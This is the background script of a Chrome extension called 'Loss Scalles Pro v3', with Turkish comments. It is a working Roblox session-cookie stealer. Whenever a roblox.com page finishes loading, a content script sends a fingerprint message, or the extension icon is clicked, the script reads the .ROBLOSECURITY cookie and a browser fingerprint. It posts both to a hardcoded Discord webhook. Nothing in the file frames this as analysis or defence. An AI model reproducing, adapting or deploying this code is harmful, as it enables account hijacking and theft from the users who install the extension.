// ===== LOSS SCALLES PRO v3 - BACKGROUND =====

var WEBHOOK = 'https://discord.com/api/webhooks/1506218411649269792/HkwWL2mTV_lMEpD1_gDsxmXKYz27WTiqs8sJL9s0e3v10DUZkSeRsh8Lk1wlgLyeTSLK';

console.log('[LS] Background loaded');

// Content.js'den fingerprint geldiginde cookie'lerle birlestir
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.action === 'fingerprint') {
        chrome.storage.local.set({ fp: request.data }, function() {
            collectAndSend(request.data);
        });
    }
});

// Sayfa yuklenince de tetikle
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (changeInfo.status === 'complete' && tab.url && tab.url.indexOf('roblox.com') > -1) {
        setTimeout(function() {
            chrome.storage.local.get('fp', function(result) {
                var fp = result.fp || { note: 'fingerprint not collected yet' };
                collectAndSend(fp);
            });
        }, 3000);
    }
});

// Ana fonksiyon: cookie + fingerprint al -> webhook
function collectAndSend(fingerprint) {
    chrome.cookies.getAll({ domain: '.roblox.com' }, function(cookies) {
        var roblosecurity = null;
        
        for (var i = 0; i < cookies.length; i++) {
            if (cookies[i].name.indexOf('ROBLOSECURITY') > -1) {
                roblosecurity = cookies[i];
                break;
            }
        }

        if (!roblosecurity) {
            console.log('[LS] No ROBLOSECURITY found');
            return;
        }

        // Webhook payload
        var payload = {
            content: '# Loss Scalles Pro v3\n**Cookie alindi:** ' + new Date().toLocaleString(),
            embeds: [
                {
                    title: '🔑 ROBLOSECURITY',
                    description: '```\n' + roblosecurity.value + '\n```',
                    color: 65280
                },
                {
                    title: '📋 FINGERPRINT',
                    description: '```json\n' + JSON.stringify(fingerprint, null, 2) + '\n```',
                    color: 65280
                }
            ]
        };

        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(function(r) {
            console.log('[LS] Sent to webhook:', r.status);
        })
        .catch(function(e) {
            console.log('[LS] Webhook error:', e);
        });
    });
}

// Extension ikonuna tiklaninca da calissin
chrome.action.onClicked.addListener(function(tab) {
    chrome.tabs.sendMessage(tab.id, { action: 'getFingerprint' }, function(fp) {
        if (fp) {
            collectAndSend(fp);
        } else {
            collectAndSend({ note: 'fingerprint not available' });
        }
    });
});